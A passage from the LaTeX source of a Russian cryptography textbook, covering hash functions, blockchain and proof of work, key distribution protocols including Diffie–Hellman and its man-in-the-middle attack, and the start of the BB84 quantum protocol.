Одним из примеров ненадёжных потоковых шифров является семейство A5\index{шифр!A5} (A5/1, A5/2), кратко рассмотренное в разделе~\ref{section:majority_generators}. Мы также рассмотрим вариант простого в понимании шифра RC4, не основанного на РСЛОС.

\input{rc4}


\chapter{Криптографические хэш-функции}\label{chapter-hash-functions}
\selectlanguage{russian}

Хэш-функции возникли как один из вариантов решения задачи <<поиска по словарю>>. Задача состояла в поиске в памяти компьютера (оперативной или постоянной) информации по известному ключу. Возможным способом решения было хранение, например, всего массива ключей (и указателей на содержимое) в отсортированном в некотором порядке списке или в виде бинарного дерева. Однако наиболее производительным с точки зрения времени доступа (при этом обладая допустимой производительностью по времени модификации) стал метод хранения в виде хэш-таблиц. Этот метод берет своё начало в стенах компании IBM (как и многое другое в программировании).

Метод хэш-таблиц подробно разобран в любой современной литературе по программированию~\cite{Knuth:2001:3}. Напомним лишь, что его идея состоит в разделении множества ключей по корзинам (\langen{bins}) в зависимости от значения некоторой функции, вычисляемой по значению ключа. Причём функция подбирается таким образом, чтобы в разных корзинах оказалось одинаковое число (в идеале -- не более одного) ключей. При этом сама функция должна быть быстро вычисляемой, а её значение должно легко конвертироваться в натуральное число, которое не превышает число корзин.

\emph{Хэш-функцией} (\langen{hash function}) называется отображение, переводящее аргумент произвольной длины в значение фиксированной длины.

\emph{Коллизией} хэш-функции называется пара значений аргумента, дающая одинаковый выход хэш-функции. Коллизии есть у любых хэш-функций, если количество различных значений аргумента превышает возможное количество значений результата функции (принцип Дирихле). А если не превышает, то и нет смысла использовать хэш-функцию.

\example
Приведём пример метода построения хэш-функции, называемого методом Меркла~---~Дамгарда\index{структура!Меркла~---~Дамгарда}~\cite{Merkle:1979, Merkle:1990, Damgard:1990}.

Пусть имеется файл $X$ в виде двоичной последовательности некоторой длины. Разделяем $X$ на несколько отрезков фиксированной длины, например по 256 символов:  $m_{1} ~\|~ m_{2} ~\|~ m_{3} ~\|~ \ldots ~\|~ m_{t}$. Если длина файла $X$ не является кратной 256 битам, то последний отрезок дополняем нулевыми символами и обозначаем $m'_{t}$.
Обозначим за $t$ новую длину последовательности. Считаем каждый отрезок $m_i, ~ i = 1, 2, \dots, t$ двоичным представлением целого числа.

Для построения хэш-функции используем рекуррентный способ вычисления. Предварительно введём вспомогательную функцию $\chi(m, H)$, называемую функцией компрессии или сжимающей функцией. Задаём начальное значение $H_{0} = 0^{256} \equiv \underbrace{000 \ldots 0}_{256} $. Далее вычисляем:
\[ \begin{array}{l}
    H_1 = \chi( m_1, H_0), \\
    H_2 = \chi( m_2, H_1), \\
    \dots,\\
    H_t = \chi( m'_t, H_{t-1}). \\
\end{array} \]
Считаем $H_{t} = h(X)$ хэш-функцией.
\exampleend

В программировании к свойствам хорошей хэш-функции относят:
\begin{itemize}
    \item быструю скорость работы;
    \item минимальное число коллизий.
\end{itemize}

Можно назвать и другие свойства, которые были бы полезны для хэш-функции в программировании. К ним можно отнести, например, отсутствие необходимости в дополнительной памяти (неиспользование <<кучи>>), простоту реализации, стабильность работы алгоритма (возврат одного и того же результата после перезапуска программы), соответствие результатов работы хэш-функции результатам работы других функций, например, функций сравнения (см. например, описания функций \texttt{hashcode()}, \texttt{equals()} и \texttt{compare()} в языке программирования Java).

\emph{Однонаправленной функцией}\index{функция!однонаправленная} $f(x)$ называется функция, обладающая следующими свойствами:
\begin{itemize}
    \item вычисление значения функции $f(x)$ для всех значений аргумента $x$ является \emph{вычислительно лёгкой} задачей;
    \item нахождение аргумента $x$, соответствующего значению функции $f(x)$, является \emph{вычислительно трудной} задачей.
\end{itemize}

Свойство однонаправленности, в частности, означает, что если в аргументе $x$ меняется хотя бы один символ, то для любого $x$ значение функции $H(x)$ меняется непредсказуемо.

\emph{Криптографически стойкой хэш-функцией} $H(x)$ называется хэш-функция, имеющая следующие свойства:
\begin{itemize}
    \item однонаправленность: \emph{вычислительно невозможно} по значению функции найти прообраз;
    \item \emph{слабая устойчивость к коллизиям}\index{устойчивость к коллизиям} (слабо бесконфликтная функция): для заданного аргумента $x$ \emph{вычислительно невозможно} найти другой аргумент $y \neq x: ~ H(x) = H(y)$;
    \item \emph{сильная устойчивость к коллизиям} (сильно бесконфликтная функция): \emph{вычислительно невозможно} найти пару разных аргументов $x \neq y: ~ H(x) = H(y)$.
\end{itemize}

Из требования на устойчивость к коллизиям, в частности, следует свойство (близости к) равномерности распределения хэш-значений.

При произвольной длине последовательности $X$ длина хэш-функции $H(X)$ в российском стандарте ГОСТ Р 34.11-94 равна 256 символам, в американском стандарте SHA несколько различных значений длин: 160, 192, 256, 512 символов.

\input{GOST_R_34.11-94.tex}

\input{GOST_R_34.11-2012.tex}

\input{MAC}

\section{Коллизии в хэш-функциях}

\input{collisions_probability}

\input{hash-functions_combinations}

\section{Blockchain (цепочка блоков)}\label{section-blockchain}\index{Blockchain|(}
\selectlanguage{russian}

Когда у вас есть знания о том, что такое криптографически стойкая хэш-функция, понять, что такое цепочка блоков (\langen{blockchain}), очень просто. Blockchain -- это последовательный набор блоков (или же, в более общем случае, ориентированный граф), каждый следующий блок в котором включает в качестве хэшируемой информации значение хэш-функции от предыдущего блока.

Технология blockchain используется для организации журналов транзакций, при этом под транзакцией может пониматься что угодно: финансовая транзакция (перевод между счетами), аудит событий аутентификации и авторизации, записи о выполненных ТО и ТУ автомобилей. При этом событие считается случившимся, если запись о нём включена в журнал.

В таких системах есть три группы действующих лиц:

\begin{itemize}
	\item генераторы событий (транзакций);
	\item генераторы блоков (фиксаторы транзакций);
	\item получатели (читатели) блоков и зафиксированных транзакций.
\end{itemize}

В зависимости от реализации эти группы могут пересекаться. В системах типа Bitcoin\index{Bitcoin}, например, все участники распределённой системы могут выполнять все три функции. Хотя за создание блоков (фиксацию транзакций) обычно отвечают выделенные вычислительные мощности, а управляющими их участников называют майнерами (\langen{miners}, см. раздел про децентрализованный blockchain далее).

Основное требование к таким журналам таково:

\begin{itemize}
	\item невозможность модификации журнала: после добавления транзакции в журнал должно быть невозможно её оттуда удалить или изменить.
\end{itemize}

Для того чтобы понять, как можно выполнить требование на запрет модификации, стоит разобраться со следующими вопросами.

\begin{itemize}
	\item Каким образом гарантируется, что внутри блока нельзя поменять информацию?
	\item Каким образом система гарантирует, что уже существующую цепочку блоков нельзя перегенерировать, тем самым исправив в них информацию?
\end{itemize}

Ответ на первый вопрос прост: нужно снабдить каждый блок хэш-суммой от его содержимого. И эту хэш-сумму включить в качестве дополнительной полезной информации (тоже хэшируемой) в следующий блок. Тогда для того, чтобы поменять что-то в блоке без разрушения доверия клиентов к нему, нужно будет это сделать таким образом, чтобы хэш-сумма от блока не поменялась. А это как раз практически невозможно, если у нас используется криптографически стойкая хэш-функция. Либо поменять в том числе и хэш-сумму блока. Но тогда придётся менять и значение этой хэш-суммы в следующем блоке. А это потребует изменений, в свою очередь, в хэш-сумме всего второго блока, а потом и в третьем, и так далее. Получается, что для того, чтобы поменять информацию в одном из блоков, нужно будет перегенерировать всю цепочку блоков, начиная с модифицируемого. Можно ли это сделать?

Тут нужно ответить на вопрос, как в подобных системах защищаются от возможности перегенерации цепочки блоков. Мы рассмотрим три варианта систем:

\begin{itemize}
	\item централизованный с доверенным центром,
	\item централизованный с недоверенным центром,
	\item децентрализованный вариант с использованием доказательства работы.
\end{itemize}

\subsection{Централизованный blockchain с доверенным центром}

Если у нас есть доверенный центр, то мы просто поручаем ему через определённый промежуток времени (или же через определённый набор транзакций) формировать новый блок, снабжая его не только хэш-суммой, но и своей электронной подписью. Каждый клиент системы имеет возможность проверить, что все блоки в цепочке сгенерированы доверенным центром и никем иным. В предположении, что доверенный центр не скомпрометирован, возможности модификации журнала злоумышленником нет.

Использование технологии blockchain в этом случае является избыточным. Если у нас есть доверенный центр, можно просто обращаться к нему с целью подписать каждую транзакцию, добавив к ней время и порядковый номер. Номер обеспечивает порядок и невозможность добавления (удаления) транзакций из цепочки, электронная подпись доверенного центра -- невозможность модификации конкретных транзакций.

\subsection{Централизованный blockchain с недоверенным центром}

Интересен случай, когда выделенный центр не является доверенным. Точнее, не является полностью доверенным. Мы ему доверяем в плане фиксации транзакций в журнале, но хотим быть уверенными, что выделенный центр не перегенерирует всю цепочку блоков, удалив из неё ненужные ему более транзакции или добавив нужные.

Для этого можно использовать, например, следующие методы.

\begin{itemize}
	\item Первый метод с использованием дополнительного доверенного хранилища. После создания очередного блока центр должен отправить в доверенное и независимое от данного центра хранилище хэш-код от нового блока. Доверенное хранилище не должно принимать никаких изменений к хэш-кодам уже созданных блоков. В качестве такого хранилища можно использовать и децентрализованную базу данных системы, если таковая присутствует. Размер хранимой информации может быть небольшим по сравнению с общим объёмом журнала.
	\item Второй возможный метод состоит в дополнении каждого блока меткой времени, сгенерированной доверенным центром временных меток. Такая метка должна содержать время генерации метки и электронную подпись центра, вычисленную на основании хэш-кода блока и времени метки. В случае, если <<недоверенный>> центр захочет перегенерировать часть цепочки блоков, будет наблюдаться разрыв в метках времени. Стоит отметить, что этот метод не гарантирует, что <<недоверенный>> центр не будет генерировать сразу две цепочки блоков, дополняя их корректными метками времени, а потом не подменит одну другой.
	\item Некоторые системы предлагаю связывать закрытые blockchain-решения и открытые (и неконтролируемые ими) сети вроде Bitcoin'а, публикую в последнем (в виде транзакции) информацию о хэш-суммах новых блоков из закрытой цепочки. В этом случае информация из открытой и неконтролируемой организацией сети позволяет доказать, что определённый блок во внутренней сети был сформирован не позднее времени создания блока в открытой сети. А отсутствие для известных (заданных заранее) адресов отправителя других транзакций позволяет доказать, что центральный узел не формирует какую-нибудь параллельную цепочку для замены в будущем.
\end{itemize}

\subsection{Децентрализованный blockchain}

Наибольший интерес для нас -- и наименьший для компаний, продающих blockchain-решения, -- представляет децентрализованная система blockchain без выделенных центров генерации блоков. Каждый участник может взять набор транзакций, ожидающих включения в журнал, и сформировать новый блок. Более того, в системах типа Bitсoin\index{Bitcoin} такой участник (будем его назвать <<майнером>>, от \langen{to mine} -- копать) ещё и получит премию в виде определённой суммы и/или комиссионных от принятых в блок транзакций.

Но нельзя просто так взять и сформировать блок в децентрализованных системах. Надёжность таких систем основывается именно на том, что новый блок нельзя сформировать быстрее (в среднем) чем за определённое время. Например, за 10 минут (Bitcoin). Это обеспечивается механизмом, который получил название доказательство работы (\langen{proof of work, PoW}).

Механизм основывается на следующей идее. Пусть есть криптографически стойкая хэш-функция $h(x)$, и задан некоторый параметр $t$ (от \langen{target} -- цель). $0 < t < 2^{n}$, где $n$ -- размер выхода хэш-функции в битах. Корректным новым блоком blockchain-сеть будет признавать только такой, значение хэш-суммы которого меньше текущего заданного параметра $t$. В этом случае алгоритм работы майнера выглядит следующий образом:
\begin{itemize}
	\item собрать из пула незафиксированных транзакций те, которые поместятся в 1 блок (1 мегабайт для сети Bitcoin\index{Bitcoin}) и имеют максимальную комиссию (решить задачу о рюкзаке\index{задача!о рюкзаке});
	\item добавить в блок информацию о предыдущем блоке;
	\item добавить в блок информацию о себе (как об авторе блока, кому начислять комиссии и бонусы за блок);
	\item установить $r$ в некоторое значение, например, $0$;
	\item выполнять в цикле:
	\begin{itemize}
		\item обновить значение $r := r + 1$;
		\item посчитать значение $h = h( \text{блок} || r)$;
		\item если $h < t$, добавить в блок $r$ и считать блок сформированным, иначе -- повторить цикл.
	\end{itemize}
\end{itemize}

Для каждой итерации цикла вероятность получить корректный блок равна $t / 2^{n}$. Так как $t$ обычно мало, то майнерам нужно сделать большое количество итераций цикла, чтобы найти нужный $r$. При этом только один (обычно -- первый) из найденных блоков будет считаться корректным. Чем больше вычислительная мощность конкретного майнера, тем больше вероятность, что именно он первым сумеет найти нужный $r$.

Зная суммарную вычислительную мощность blockchain-сети, участники могут договориться о таком механизме изменения параметра $t$, чтобы время генерации нового корректного блока было примерно заданное время. Например, в сети Bitcoin параметр $t$ пересчитывается каждые 2016 блоков таким образом, чтобы среднее время генерации блока было 10 минут. Это позволяет адаптировать сеть к изменению количества участников, их вычислительных мощностей и к появлению новых механизмов вычисления хэш-функций.

Кроме задания параметра $t$ можно оперировать другими величинами, так или иначе относящимися к мощности вычислений.
\begin{itemize}
	\item \textit{Hashrate} -- количество хэшей, которые считают за единицы времени конкретный майнер или сеть в целом. Например, в ноябре 2017 года общий hashrate для сети Bitcoin составлял примерно $7,7 \times 10^{18}$ хэшей в секунду.
	\item \textit{Difficulty} -- сложность поиска корректного блока, выражаемая как $d = d_{const} / t$, где $d_{const}$ -- некоторая константа сложности, а $t$ -- текущая цель (\langen{target}). В отличие от параметра $t$, который падает с ростом вычислительной мощности сети, $d$ изменяется вместе с $hashrate$, что делает его более простым для восприятия и анализа человеком.
\end{itemize}

В случае примерно одновременной генерации следующего блока двумя и более майнерами (когда информация о новом блоке публикуется вторым майнером до того, как ему придёт информация о новом блоке от первого) в направленном графе блоков происходит разветвление. Далее каждый из майнеров выбирает один из новых блоков (например -- какой первый увидели) и пытается сгенерировать новый блок на основе выбранного, продолжая <<ответвление>> в графе. В конце концов одна из двух таких цепочек становится длиннее (та, которую выбрало большее число майнеров), и именно она признаётся основной.

В случае нормального поведения системы на включение конкретных транзакций в блоки это влияет мало, так как каждый из добросовестных майнеров следует одному и тому же алгоритму включения транзакций в блок (например, в сети Bitcoin\index{Bitcoin} -- алгоритму максимизации комиссии за блок). Однако можно предположить, что какой-нибудь злоумышленник захочет <<модерировать>> распределённый blockchain, включая или не включая в блоки транзакции по своему выбору. Предположим, что доля вычислительных ресурсов злоумышленника (направленных на генерацию нового блока) равна $p, 0 < p < 1/2$. В этом случае каждый следующий сгенерированный блок с вероятностью $p$ будет сгенерирован мощностями злоумышленника. Это позволит ему включать в блоки те транзакции, которые другие майнеры включать не захотели.

Но позволит ли это злоумышленнику не включать что-то в цепочку транзакций? Нет. Потому что после его блока с вероятностью $1 - p$ будет следовать блок <<обычного>> майнера, который с радостью (пропорциональной комиссии-награде) включит все транзакции в свой блок.

Однако ситуация меняется, если мощности злоумышленника составляют более 50\% от мощности сети. В этом случае, если после блока злоумышленника был с вероятностью $1 - p$ сгенерирован <<обычный>> блок, злоумышленник его может просто проигнорировать и продолжать генерировать новые блоки, как будто он единственный майнер в сети. Тогда если среднее время генерации одного блока всеми мощностями $t$, то за время $T$ злоумышленник сможет сгенерировать $N_E = p \times T / t$, а легальные пользователи $N_L = (1 - p) \times T / t$ блоков, $N_E > N_L$. Даже если с некоторой вероятностью легальные пользователи сгенерируют 2 блока быстрее, чем злоумышленник один, последний всё равно <<догонит и перегонит>> <<легальную>> цепочку примерно за время $t / (2p - 1)$. Так как в blockchain есть договоренность, что за текущее состояние сети принимается наиболее длинная цепочка, именно цепочка злоумышленника всегда будет восприниматься правильной. Получается, что злоумышленник сможет по своему желанию включать или не включать транзакции в цепочки.

Правда, пользоваться чужими деньгами злоумышленник всё равно не сможет -- так как все блоки транзакций проверяются на внутреннюю непротиворечивость и корректность всех включённых в блок транзакций.

Кроме концепции <<доказательство работы>> используются и другие. Например, в подходе <<доказательство доли владения>> (\langen{proof of share, PoS}), который планировалось использовать в сетях Etherium и EmerCoin, вероятность генерации блока пропорциональна количеству средств на счетах потенциальных создателей нового блока. Это намного более энергоэффективно по сравнению с PoW, и, кроме того, связывает ответственность за надёжность и корректность генерации новых блоков с размером капитала (чем больше у нас средств, тем меньше мы хотим подвергать опасности систему). С другой стороны, это даёт дополнительную мотивацию концентрировать больше капитала в одних руках, что может привести к централизации системы.

\subsection{Механизм внесения изменений в протокол}
Любая система должна развиваться. Но у децентрализованных систем нельзя просто <<включить один рубильник>> и заставить участников системы работать по-новому -- иначе систему нельзя назвать полностью децентрализованной. Механизмы и способы внесения изменений могут выглядеть на первый взгляд нетривиально. Например:

\begin{enumerate}
	\item апологеты системы предлагают изменения в правилах работы;
	\item авторы ПО вносят изменения в программный код, позволяя сделать две вещи:
	\begin{itemize}
		\item указать участникам системы, что они поддерживают новое изменение,
		\item поддержать новое изменение;
	\end{itemize}
	\item участники системы скачивают новую версию и выставляют в новых блоках транзакций (или в самих транзакциях) сигнальные флаги, показывающие их намерение поддержать изменение;
	\item если к определённой дате определённое число блоков (или число транзакций, или объём транзакций) содержат сигнальный флаг, то изменение считается принятым, и большая (по числу новых блоков) часть участников системы в определённую дату включают эти изменения;
	\item те участники, которые не приняли изменения, или приняли изменения вопреки отсутствию согласия на них большей части участников, в худшем случае начнут генерировать свою цепочку блоков, только её признавая корректной. Основную цепочку блоков они будут считать неверно сгенерированной. По факту это приведёт к дублированию (разветвлению, форку) системы, когда в какую-то дату вместо одного журнала транзакций появляется два, ведущимися разными людьми. Это журналы совпадают до определённой даты, после чего в них начинаются расхождение.
\end{enumerate}

Подводя итоги, Сатоши Накамото (псевдоним, \langen{Satoshi Nakamoto}), автор технологий blockchain и Bitcoin\index{Bitcoin}, сумел предложить работающий децентрализованный механизм, в котором и само поведение системы, и изменения к этой системе проходят через явный или неявный механизм поиска консенсуса участников. Для получения контроля над системой в целом злоумышленнику придётся получить контроль как минимум над 50\% всех мощностей системы (в случае PoW), а без этого можно лишь попытаться ограничить возможность использования системы конкретными участниками.

Однако созданная технология не лишена недостатков. Существуют оценки, согласно которым использование метода PoW для системы bitcoin приводит к затратам энергии, сравнимой с потреблением электричества целыми городами или странами. Есть проблемы и с поиском консенсуса -- сложный механизм внесения изменений, как считают некоторые эксперты, может привести к проблемам роста (например, из-за ограниченности числа транзакций в блоке), и, в будущем, к отказу использования механизма как устаревшего и не отвечающего будущим задачам.

\index{Blockchain|)}



\input{public-key}

\chapter{Распространение ключей}\index{протокол!распространения ключей}\label{chapter-key-distribution-protocols}
\selectlanguage{russian}

Задача распространения ключей является одной из множества задач построения надёжной сети общения многих абонентов. Задача состоит в получении в нужный момент времени двумя легальными абонентами сети секретного сессионного ключа шифрования (и аутентификации сообщений). Хорошим решением данной задачи будем считать такой протокол распространения ключей, который удовлетворяет следующим условиям.

\begin{itemize}
	\item В результате работы протокола между двумя абонентами должен быть сформирован секретный сессионный ключ.
	\item Успешное окончание работы протокола распространения ключей должно означать успешную взаимную аутентификацию абонентов. Не должно быть такого, что протокол успешно завершился с точки зрения одной из сторон, а вторая сторона при этом представлена злоумышленником.
	\item К участию в работе протокола должны допускаться только легальные пользователи сети. Внешний пользователь не должен иметь возможность получить общий сессионный ключ с кем-либо из абонентов.
	\item Добавление нового абонента в сеть (или исключение из неё) не должно требовать уведомления всех участников сети.
\end{itemize}

Последнее требование сразу исключает такие варианты протоколов, в которых каждый из абонентов знал бы некоторый мастер-ключ общения с любым другим участником. Данные варианты плохи тем, что с ростом системы количество пар мастер-ключей <<абонент-абонент>> растёт как квадрат от количества участников. Поэтому большая часть рассматриваемых решений состоит в том, что в сети выделяется один или несколько доверенных центров T (\langen{Trent}, от \langen{trust}), которые как раз и владеют информацией обо всех легальных участниках сети и их ключах. Они же будут явно или неявно выступать одним из участников протоколов по формированию сеансовых ключей.

\begin{figure}[!htb]
    \centering
    \includegraphics[width=0.8\textwidth]{pic/key_distribution-networks}
    \caption{Варианты сетей без выделенного доверенного центра и с выделенным доверенным центром T\label{fig:key_distribution-networks}}
\end{figure}

Важным моментом при анализе решений данной задачи является то, что сессионные ключи, вырабатываемые в конкретный момент времени, являются менее надёжными, чем мастер-ключи, используемые для генерации сессионных. В частности, нужно предполагать, что хотя злоумышленник не может получить сессионный ключ во время общения абонентов, он может сделать это по прошествии некоторого времени (дни, недели, месяцы). И хотя знание этого сессионного ключа поможет злоумышленнику расшифровать старые сообщения, он не должен иметь возможность организовать новую сессию с использованием уже известного ему сессионного ключа.

\input{key_distribution-simmetric}

\input{three-pass_protocols}

\section{Асимметричные протоколы}

Асимметричные протоколы, или же протоколы, основанные на криптосистемах с открытыми ключами, позволяют ослабить требования к предварительному этапу протоколов. Вместо общего секретного ключа, который должны иметь две стороны (либо обе стороны и доверенный центр), в рассматриваемых ниже протоколах стороны должны предварительно обменяться открытыми ключами (между собой либо между собой и доверенным центром). Такой предварительный обмен может проходить по открытому каналу связи, в предположении, что криптоаналитик не может повлиять на содержимое канала связи на данном этапе.

\subsection{Простой протокол}

Рассмотрим протокол распространения ключей с помощью асимметричных шифров. Введём обозначения: $K_B$ -- открытый ключ стороны $B$, а $K_A$ -- открытый ключ стороны $A$. Протокол включает три сеанса обмена информацией.
\begin{enumerate}
    \item В первом сеансе сторона $A$ посылает стороне $B$ сообщение:
            \[ A \rightarrow B: ~ E_{K_B}(K_1, A), \]
        где $K_1$ -- ключ, выработанный стороной $A$.
    \item Сторона $B$ получает $(K_1, A)$ и передаёт стороне $A$ наряду с другой информацией свой ключ $K_2$ в сообщении, зашифрованном с помощью открытого ключа $K_A$:
            \[ A \leftarrow B: ~ E_{K_A}(K_2, K_1, B). \]
    \item Сторона $A$ получает и расшифровывает сообщение $(K_2, K_1, B)$. Во время третьего сеанса сторона $A$, чтобы подтвердить, что она знает ключ $K_2$, посылает стороне $B$ сообщение:
            \[ A \rightarrow B: ~ E_{K_B}(K_2). \]
\end{enumerate}
Общий ключ формируется из двух ключей: $K_1$ и $K_2$.

\subsection{Протоколы с цифровыми подписями}

Существуют протоколы обмена, в которых перед началом обмена ключами генерируются подписи сторон $A$ и $B$, соответственно $S_A(m)$ и $S_B(m)$. В этих протоколах можно использовать различные одноразовые метки. Рассмотрим пример.
\begin{enumerate}
    \item Сторона $A$ выбирает ключ $K$ и вырабатывает сообщение:
            \[ \left( K, ~ t_A, ~ S_A(K, t_A, B) \right), \]
        где $t_A$ -- метка времени. Зашифрованное сообщение передаёт стороне $B$:
        \[ A \rightarrow B: ~ E_{K_B}(K, ~ t_A, ~ S_A(K, t_A, B)). \]
    \item Сторона $B$ получает это сообщение, расшифровывает $\left( K, ~ t_A, ~ S_A(K, t_A, B) \right)$ и вырабатывает свою метку времени $t_B$. Проверка считается успешной, если $|t_B - t_A | < \delta $. Сторона $B$ знает свои реквизиты и может осуществлять проверку подписи.
\end{enumerate}

Имеется второй вариант протокола, в котором шифрование и подпись выполняются раздельно.
\begin{enumerate}
    \item Сторона $A$ вырабатывает ключ $K$, использует одноразовую метку (или метку времени) $t_{A}$ и передаёт стороне $B$ два различных зашифрованных сообщения:
            \[ \begin{array}{ll}
                A \rightarrow B: & ~ E_{K_B}(K, t_A), \\
                A \rightarrow B: & ~ S_A(K, t_A, B). \\
            \end{array} \]
    \item Сторона $B$ получает это сообщение, расшифровывает $K, t_A$ и, добавив свои реквизиты, может проверить подпись $S_A(K, t_A, B)$.
\end{enumerate}

В третьем варианте протокола сначала производится шифрование, потом подпись.
\begin{enumerate}
    \item Сторона $A$ вырабатывает ключ $K$, использует одноразовую случайную метку или метку времени $t_A$ и передаёт стороне $B$ сообщение:
        \[ A \rightarrow B: ~ t_A, ~ E_{K_B}(K, A), ~ S_A(t_A, ~ K, ~ E_{K_B}(K, A)). \]
    \item Сторона $B$ получает это сообщение, расшифровывает $\left( K, ~ A \right)$ и проверяет подпись $S_A(t_A, ~ K, ~ E_{K_B}(K, A))$.
\end{enumerate}

\subsection{Протокол Диффи~---~Хеллмана}\index{протокол!Диффи~---~Хеллмана}
\selectlanguage{russian}

Алгоритм с открытым ключом впервые был предложен Диффи и Хеллманом в работе 1976 года <<Новые направления в криптографии>> (\langen{Bailey Whitfield Diffie, Martin Edward Hellman, ``New directions in cryptography''},~\cite{Diffie:Hellman:1976}).

Рассмотрим протокол Диффи~---~Хеллмана обмена информацией двух сторон $A$ и $B$. Задача состоит в том, чтобы создать общий сеансовый ключ.

Пусть $p$ -- большое простое число\index{число!простое}, $g$ -- примитивный элемент группы $\Z_p^*$, ~ $f = g^x \mod p$, причём $p,f,g$ известны заранее. Функцию $f(x)=g^{x} \mod p$ считаем однонаправленной, то есть вычисление функции при известном значении аргумента является лёгкой задачей, а её обращение -- нахождение аргумента при известном значении функции -- трудной.

Протокол обмена состоит из следующих действий.
\begin{enumerate}
    \item Сторона $A$ выбирает случайное число $x: ~ 2 \leq x \leq p-1$, вычисляет и передаёт стороне $B$ сообщение:
        \[ A \rightarrow B: ~ g^x \mod p. \]
    \item Сторона $B$ выбирает случайное число $y: ~ 2\leq y \leq p-1$, вычисляет и передаёт стороне $A$:
        \[ A \leftarrow B: ~ g^y \mod p. \]
    \item Сторона $A$, используя известные ей значения $x$, $g^{y} \mod p$, вычисляет ключ:
        \[ K_{A} =(g^{y})^{x}\mod p=g^{xy} \mod p. \]
    \item Сторона $B$, используя известные ей значения $y$, $g^{x} \mod p$, вычисляет ключ:
        \[ K_{B} =(g^{x})^{y}\mod p=g^{xy}\mod p. \]
        В результате получаем равенство $K_A = K_B = K$.
\end{enumerate}

Таким способом создан общий секретный сеансовый ключ. В каждом новом сеансе используется этот же протокол для создания нового сеансового ключа.

Рассмотрим протокол Диффи~---~Хеллмана в ситуации, когда имеются три легальных пользователя $A,B,C$.

Каждая из сторон $A,B,C$ вырабатывает случайные числа $x,y,z$ соответственно и держит их в секрете.

\begin{enumerate}
    \item Первый этап обмена информацией аналогичен вышеописанному обмену информацией между двумя сторонами:
        \begin{enumerate}
            \item $A \rightarrow B: ~ g^x \mod p$.
            \item $B \rightarrow C: ~ g^y \mod p$.
            \item $C \rightarrow A: ~ g^z \mod p$.
        \end{enumerate}
    \item Второй этап состоит из передач сообщений:
        \begin{enumerate}
            \item $A \rightarrow B: ~ (g^z)^x = g^{zx} \mod p$.
            \item $B \rightarrow C: ~ (g^x)^y = g^{xy} \mod p$.
            \item $C \rightarrow A: ~ (g^y)^z = g^{yz} \mod p$.
        \end{enumerate}
    \item На завершающем третьем этапе стороны вычисляют:
        \begin{enumerate}
            \item $A: ~ K_A = (g^{yz})^x = g^{xyz} \mod p$.
            \item $B: ~ K_B = (g^{zx})^y = g^{xyz} \mod p$.
            \item $C: ~ K_C = (g^{xy})^z = g^{xyz} \mod p$.
        \end{enumerate}
\end{enumerate}

Как видно из произведённых действий, выработанные сторонами $A, B, C$ ключи совпадают: $K_A = K_B = K_C = K$. Следовательно, создан общий секретный сеансовый ключ $K$ для трёх участников.

Таким же образом можно построить протокол Диффи~---~Хеллмана для любого числа легальных пользователей.

Рассмотрим этот двусторонний протокол с точки зрения криптоаналитика, желающего узнать ключ $K$. Предположим, ему удалось перехватить сообщения $g^{x}\mod p$ и $g^{y}\mod p $. Используя заранее известные данные $g,p $ и эти сообщения, криптоаналитик старается найти хотя бы одно из чисел $(x,y)$, то есть решить задачу дискретного логарифма. В настоящее время эта задача считается вычислительно трудной при обычно выбираемых значениях $p\sim 2^{1024}$.

Существует атака активного криптоаналитика\index{криптоаналитик!активный}, названная <<человек посередине>> (man-in-the-middle)\index{атака!<<человек посередине>>}. Пусть имеются две легальные стороны $A$ и $B$ и нелегальная сторона $E$ -- активный криптоаналитик\index{криптоаналитик!активный}, который имеет возможность перехватывать и подменять сообщения как от $A$, так и от $B$:
    \[ A \leftrightsquigarrow E \leftrightsquigarrow B. \]
    %\[ A \leftrightarrow E \leftrightarrow B. \]

\begin{enumerate}
    \item Подмена ключей.
        \begin{enumerate}
            \item Сторона $A$ передаёт стороне $B$ сообщение:
                \[ A \overset{E}{\nrightarrow} B: ~ g^x \mod p. \]
            \item Сторона $E$ перехватывает сообщение $g^x \mod p$, сохраняет его и, зная $g$, передаёт стороне $B$ своё сообщение:
                \[ E \rightarrow B: ~ g^z \mod p. \]
            \item Сторона $B$ передаёт стороне $A$ сообщение:
                \[ A \overset{E}{\nleftarrow} B: ~ g^y \mod p. \]
            \item Сторона $E$ перехватывает сообщение $g^y \mod p$, сохраняет его и передаёт стороне $A$ своё сообщение:
                \[ A \leftarrow E: ~ g^z \mod p \]
                или какое-то другое.
            \item Таким образом, между сторонами $A$ и $E$ образуется общий секретный ключ $K_{AE}$, между $B$ и $E$ -- ключ $K_{BE}$, причём $A$ и $B$ не знают, что у них ключи со стороной $E$, а не друг с другом:
                \[ \begin{array} {l}
                    K_{AE} = g^{xz} \mod p, \\
                    K_{BE} = g^{yz} \mod p. \\
                \end{array} \]

        \end{enumerate}
    \item Подмена сообщений.
        \begin{enumerate}
            \item Сторона $A$ посылает $B$ сообщение $m$, зашифрованное на ключе $K_{AE}$:
                % \rightsquigarrow
                \[ A \overset{E}{\nrightarrow} B: ~ E_{K_{AE}}(m). \]
            \item Сторона $E$ перехватывает сообщение, расшифровывает с ключом $K_{AE}$, возможно, подменяет на $m'$, зашифровывает с ключом $K_{BE}$ и посылает $B$:
                \[ E \rightarrow B: ~ E_{K_{BE}}(m'). \]
            \item То же самое происходит при обратной передаче от $B$ к $A$.
        \end{enumerate}
\end{enumerate}

Криптоаналитик $E$ имеет возможность перехватывать и подменять все передаваемые сообщения. Если по тексту письма нельзя обнаружить участие криптоаналитика в обмене информацией, то атака <<человек посередине>>\index{атака!<<человек посередине>>} успешна.

Существует несколько протоколов для защиты от атаки этого типа.


%\section{Протоколы с аутентификацией}

\subsection{Односторонняя аутентификация}

\input{el-gamal_protocol}

\input{mti}

\input{sts}

\input{girault_scheme}

\input{bloms_scheme}

\section{Квантовые протоколы}\index{протокол!квантовые|(}

\subsection{Протокол BB84}\index{протокол!BB84|(}
\selectlanguage{russian}

В 1984 году Чарльз Беннетт (\langen{Charles Henry Bennett}) и Жиль Брассар (\langfr{Gilles Brassard}) предложили новый квантовый протокол распределения ключа~\cite{Bennett:Brassard:1984}. Как и у других протоколов, его целью является создание нового сеансового ключа, который в дальнейшем можно использовать в классической симметричной криптографии. Однако особенностью протокола является использование отдельных положений квантовой физики для гарантии защиты получаемого ключа от перехвата злоумышленником.

До начала очередного раунда генерации сеансового ключа предполагается, что у Алисы и Боба, как у участников протокола, имеется:

\begin{itemize}
	\item квантовый канал связи (например, оптоволокно);
	\item классический канал связи.
\end{itemize}

